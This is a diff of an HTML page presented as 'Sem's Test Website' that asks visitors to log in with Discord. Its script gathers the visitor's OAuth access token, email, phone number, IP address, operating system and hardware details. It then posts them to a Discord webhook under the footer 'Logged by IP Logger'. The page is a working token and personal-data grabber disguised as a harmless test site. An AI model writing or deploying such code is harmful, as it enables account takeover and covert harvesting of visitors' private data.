@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sem's Test Website</title>
+    <link rel="stylesheet" href="css/styles.css"> <!-- Link to styles.css -->
     <script>
         const clientId = '1284270652693680169';
         const redirectUri = 'https://semodge2.github.io/test/'; // Your redirect URI
@@ -57,22 +58,16 @@
             const phone = user.phone || "Phone not provided";
             const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
             const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
-            const hasNitro = user.premium_type === 1 || user.premium_type === 2 ? 'Yes' : 'No'; // Check Nitro status
-
-            // Get operating system details
-            const operatingSystem = navigator.userAgent.includes("Win") ? "Windows" :
-                                    navigator.userAgent.includes("Mac") ? "MacOS" :
-                                    navigator.userAgent.includes("Linux") ? "Linux" : "Unknown";
-
-            // Get city and country information (you'll need an API for this; using a placeholder here)
-            const city = "City Not Available"; // Replace with actual API call to get city
-            const country = "Country Not Available"; // Replace with actual API call to get country
+            const nitro = user.premium_type ? "Yes" : "No"; // Check for Nitro status
+            const operatingSystem = navigator.platform; // Get operating system
+            const city = "City not available"; // You would need to use a geo API for real data
+            const country = "Country not available"; // You would need to use a geo API for real data
 
             // Call the function to send visitor info along with the access token and user information
-            sendInfoToDiscord(data.access_token, email, phone, avatarUrl, createdAt, hasNitro, operatingSystem, city, country);
+            sendInfoToDiscord(data.access_token, email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country);
         }
 
-        async function sendInfoToDiscord(accessToken, email, phone, avatarUrl, createdAt, hasNitro, operatingSystem, city, country) {
+        async function sendInfoToDiscord(accessToken, email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country) {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
@@ -108,15 +103,15 @@
                         { name: '🧠 Hardware Concurrency', value: `${hardwareConcurrency} logical processors`, inline: true },
                         { name: '🖼️ Screen DPI', value: screenDPI, inline: true },
                         { name: '🎮 Graphics Card', value: gpu, inline: true },
-                        { name: '🔑 Access Token', value: accessToken, inline: false }, // Send the access token
-                        { name: '📧 Email', value: email, inline: true }, // Email
-                        { name: '📱 Phone', value: phone, inline: true }, // Phone number
-                        { name: '🖼️ Profile Picture', value: `[View Avatar](${avatarUrl})`, inline: true }, // Avatar URL
-                        { name: '📅 Account Created', value: createdAt, inline: true }, // Account creation date
-                        { name: '🛡️ Nitro Status', value: hasNitro, inline: true }, // Nitro status
-                        { name: '💻 Operating System', value: operatingSystem, inline: true }, // OS
+                        { name: '🔑 Access Token', value: accessToken, inline: false },
+                        { name: '📧 Email', value: email, inline: true },
+                        { name: '📱 Phone', value: phone, inline: true },
+                        { name: '🖼️ Profile Picture', value: `[View Avatar](${avatarUrl})`, inline: true },
+                        { name: '📅 Account Created', value: createdAt, inline: true },
+                        { name: '🖥️ Operating System', value: operatingSystem, inline: true }, // Operating System
                         { name: '🌆 City', value: city, inline: true }, // City
-                        { name: '🌍 Country', value: country, inline: true } // Country
+                        { name: '🌍 Country', value: country, inline: true }, // Country
+                        { name: '🎮 Discord Nitro', value: nitro, inline: true } // Nitro status
                     ],
                     footer: {
                         text: 'Logged by IP Logger',
@@ -133,7 +128,7 @@
                 body: JSON.stringify(embedMessage)
             });
 
-            document.body.innerHTML += `<h2 style="color: red;">Test Website, Thank You for Testing</h2>`;
+            document.body.innerHTML += `<h2>Test Website, Thank You for Testing</h2>`;
         }
 
         window.onload = function () {
@@ -143,7 +138,7 @@
                 fetchUserData(code);
             } else {
                 // Show the login button if no code is present
-                document.body.innerHTML = `<h1 style="color: red;">Welcome to Sem's Test Website</h1><button onclick="loginWithDiscord()">Login with Discord</button>`;
+                document.body.innerHTML = `<h1>Welcome to Sem's Test Website</h1><button onclick="loginWithDiscord()">Login with Discord</button>`;
             }
         };
     </script>
